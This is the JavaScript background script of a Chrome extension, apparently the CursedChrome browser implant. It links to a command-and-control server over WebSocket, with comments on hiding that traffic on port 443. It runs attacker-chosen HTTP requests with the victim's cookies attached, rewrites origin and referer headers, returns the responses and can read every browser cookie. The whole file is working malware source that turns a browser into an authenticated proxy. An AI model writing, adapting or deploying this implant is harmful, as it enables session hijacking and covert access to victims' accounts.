var last_live_connection_timestamp = get_unix_timestamp();
chrome.storage.sync.set({ last_live_connection_timestamp });
var placeholder_secret_token = get_secure_random_token(64);
chrome.storage.sync.set({ placeholder_secret_token });

// Used as a table to hold the final metadata to return for
// 301 requests which fetch() can't normally handle.


const REQUEST_HEADER_BLACKLIST = [
    'cookie'
];

const RPC_CALL_TABLE = {
    'HTTP_REQUEST': perform_http_request,
    'PONG': () => {}, // NOP, since timestamp is updated on inbound message.
    'AUTH': authenticate,
};

/*
Return an array of cookies for the current cookie store.
*/
async function get_cookies(params) {
    // If the "cookies" permission is not available
    // just return an empty array.
    if(!chrome.cookies) {
        return [];
    }
    return getallcookies({});
}


function getallcookies(details) {
    return new Promise(function(resolve, reject) {
        try {
            chrome.cookies.getAll(details, function(cookies_array) {
                resolve(cookies_array);
            });
        } catch(e) {
            reject(e);
        }
    });
}

async function authenticate(params) {
    // Check for a previously-set browser identifier.
    var browser_id="";
    chrome.storage.sync.get(["browser_id"]).then((result) => {
        browser_id = result;
    });
    // If no browser ID is already set we generate a
    // new one and return it to the server.
    if(browser_id == "") {
        browser_id = uuidv4();
        chrome.storage.sync.set({ 'browser_id': browser_id });
    }
    
    /*
    Return the browser's unique ID as well as
    some metadata about the instance.
    */
   return {
       'browser_id': browser_id,
       'user_agent': navigator.userAgent,
       'timestamp': get_unix_timestamp()
    }
}

function get_secure_random_token(bytes_length) {
    const validChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let array = new Uint8Array(bytes_length);
    crypto.getRandomValues(array);
    array = array.map(x => validChars.charCodeAt(x % validChars.length));
    const random_string = String.fromCharCode.apply(null, array);
    return random_string;
}

function uuidv4() {
  return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
  );
}

function btoa(inputString) {
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    var outputString = '';
 
    for (var i = 0; i < inputString.length; i += 3) {
       var byte1 = inputString.charCodeAt(i);
       var byte2 = (i + 1 < inputString.length) ? inputString.charCodeAt(i + 1) : 0;
       var byte3 = (i + 2 < inputString.length) ? inputString.charCodeAt(i + 2) : 0;
 
       var b1 = byte1 >> 2;
       var b2 = ((byte1 & 0x03) << 4) | (byte2 >> 4);
       var b3 = ((byte2 & 0x0F) << 2) | (byte3 >> 6);
       var b4 = byte3 & 0x3F;
 
       if (!byte2) {
          b3 = b4 = 64;
       }
       else if (!byte3) {
          b4 = 64;
       }
 
       outputString += chars.charAt(b1) + chars.charAt(b2) + chars.charAt(b3) + chars.charAt(b4);
    }
 
    return outputString;
 }

function arrayBufferToBase64(buffer) {
    var binary = '';
    var bytes = new Uint8Array(buffer);
    var len = bytes.byteLength;
    for (var i = 0; i < len; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
}

function get_unix_timestamp() {
    return Math.floor(Date.now() / 1000);
}


chrome.alarms.create('myAlarm', {
    periodInMinutes: 0.05
});

const HEADERS_TO_REPLACE = [
    'origin',
    'referer',
    'access-control-request-headers',
    'access-control-request-method',
    'access-control-allow-origin',
    'date',
    'dnt',
    'trailer',
    'upgrade'
];

async function perform_http_request(params) {
    // Whether to include cookies when sending request
    const credentials_mode = params.authenticated ? 'include' : 'omit';
   

    // Set the X-PLACEHOLDER-SECRET to the generated secret.

    // List of keys for headers to replace with placeholder headers
    // which will be replaced on the wire with the originals.
    var headers_to_replace = [];

    // Loop over headers and find any that need to be replaced.
    const header_keys = Object.keys(params.headers);
    header_keys.map(header_key => {
        if (HEADERS_TO_REPLACE.includes(header_key.toLowerCase())) {
            headers_to_replace.push(
                header_key
            );
        }
    });

    // Then replace all headers with placeholder headers
    headers_to_replace.map(header_key => {
        const new_header_key = `X-PLACEHOLDER-${header_key}`
        params.headers[new_header_key] = params.headers[header_key];
        delete params.headers[header_key];
    });

    var request_options = {
        method: params.method,
        mode: 'cors',
        cache: 'no-cache',
        credentials: credentials_mode,
        headers: params.headers,
        redirect: 'follow'
    }

    // If there is a request body, we decode it
    // and set it for the request.
    if (params.body) {
        // This is a hack to convert base64 to a Blob
        const fetchURL = `data:application/octet-stream;base64,${params.body}`;
        const fetchResp = await fetch(fetchURL);
        request_options.body = await fetchResp.blob();
    }

    try {
        var response = await fetch(
            params.url,
            request_options
        );
    } catch (e) {
        console.error(`Error occurred while performing fetch:`);
        console.error(e);
        return;
    }

    var response_headers = {};

    for (var pair of response.headers.entries()) {
        // Fix Set-Cookie from onHeadersReceived (fetch() doesn't expose it)
        if (pair[0] === 'x-set-cookie') {
            // Original Set-Cookie may merge multiple headers, we have it packed
            response_headers['Set-Cookie'] = JSON.parse(pair[1]);
        }
        else {
            response_headers[pair[0]] = pair[1];
        }
    }

    const redirect_hack_url_prefix = `${location.origin.toString()}/redirect-hack.html?id=`;

    // Handler 301, 302, 307 edge case
    if(response.url.startsWith(redirect_hack_url_prefix)) {
        var response_metadata_string = decodeURIComponent(response.url);
        response_metadata_string = response_metadata_string.replace(
            redirect_hack_url_prefix,
            ''
        );
        const redirect_hack_id = response_metadata_string;
        chrome.storage.sync.get([redirect_hack_id], function(redirect_table) {
            const response_metadata = redirect_table[redirect_hack_id];
            redirect_table[redirect_hack_id]=''
            chrome.storage.sync.set( redirect_table);

            
            // Format headers
            var redirect_hack_headers = {};
            response_metadata.headers.map(header_data => {
                // Original Set-Cookie may merge multiple headers, skip it
                if (header_data.name.toLowerCase() !== 'set-cookie') {
                if (header_data.name === 'X-Set-Cookie') {
                    redirect_hack_headers['Set-Cookie'] = JSON.parse(header_data.value);
                }
                else {
                    redirect_hack_headers[header_data.name] = header_data.value;
                }
            }
            });
        
            const redirect_hack_data = {
                'url': response.url,
                'status': response_metadata.status_code,
                'status_text': 'Redirect',
                'headers': redirect_hack_headers,
                'body': '',
            };
            
            return redirect_hack_data;
        });
    }

    return {
        'url': response.url,
        'status': response.status,
        'status_text': response.statusText,
        'headers': response_headers,
        'body': arrayBufferToBase64(
            await response.arrayBuffer()
        )
    }
}


 function initialize() {
    // Replace the below connection URI with whatever
    // the host details you're using are.
    // ** Ideal setup is the following **
    // Have Nginx doing a reverse-proxy (proxy_pass) to
    // the CursedChrome server with a HTTPS cert setup. 
    // For SSL/TLS WebSockets, instead of https:// you need
    // to use wss:// as the protocol. For maximum stealth,
    // setting the WebSocket port to be the standard 
    // TLS/SSL port (this will make sure tools like little
    // snitch don't alert on a new port connection from Chrome).
    websocket = new WebSocket("ws://127.0.0.1:4343");
    
    websocket.addEventListener('open', function() {
        console.log('Connected');
    });
    websocket.addEventListener('close', function(event) {
        console.log('Connection lost');
        if (event.wasClean) {
            console.log(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
        } else {
            // e.g. server process killed or network down
            // event.code is usually 1006 in this case
            console.log('[close] Connection died');
        }
    });
    websocket.addEventListener('message', async function(event) {
        console.log('message',event.data);
         // Update last live connection timestamp
         last_live_connection_timestamp = get_unix_timestamp();
         chrome.storage.sync.set({ last_live_connection_timestamp });
 
 
         try {
             var parsed_message = JSON.parse(
                 event.data
             );
         } catch (e) {
             console.error(`Could not parse WebSocket message!`);
             console.error(e);
             return
         }
 
         if (parsed_message.action in RPC_CALL_TABLE) {
             const result = await RPC_CALL_TABLE[parsed_message.action](parsed_message.data);
             websocket.send(
                 JSON.stringify({
                     // Use same ID so it can be correlated with the response
                     'id': parsed_message.id,
                     'origin_action': parsed_message.action,
                     'result': result,
                 })
             )
         } else {
             console.error(`No RPC action ${parsed_message.action}!`);
         }
    });
    websocket.addEventListener('error', function(error) {
        console.log(`[error] ${error.message}`);
    });
    
    return function interval(){
        const PENDING_STATES = [
            0, // CONNECTING
            2 // CLOSING
        ];
        var {last_live_connection_timestamp} = chrome.storage.sync.get(["last_live_connection_timestamp"]);
        // Check WebSocket state and make sure it's appropriate
        
        if (PENDING_STATES.includes(websocket.readyState)) {
            console.log(`WebSocket not in appropriate state for liveness check...`);
            return
        }
        // Check if timestamp is older than ~15 seconds. If it
        // is the connection is probably dead and we should restart it.
        const current_timestamp = get_unix_timestamp();
        const seconds_since_last_live_message = current_timestamp - last_live_connection_timestamp;
        if (seconds_since_last_live_message > 29 || websocket.readyState === 3) {
            console.error(`WebSocket does not appear to be live! Restarting the WebSocket connection...`);
            try {
                websocket.close();
            } catch (e) {
            // Do nothing.
        }
            initialize();
            return
        }
        // Send PING message down websocket, this will be
        // replied to with a PONG message form the server
        // which will trigger a function to update the 
        // last_live_connection_timestamp variable.
        
        // If this timestamp gets too old, the WebSocket
        // will be severed and started again.
        websocket.send(
            JSON.stringify({
                'id': uuidv4(),
                'version': '1.0.0',
                'action': 'PING',
                'data': {}
            })
        );
    }

}

const interval = initialize();


chrome.alarms.create('myAlarm', {
    periodInMinutes: 0.05
});

chrome.alarms.onAlarm.addListener(async () => {
    interval();
});

const REDIRECT_STATUS_CODES = [
    301,
    302,
    307
];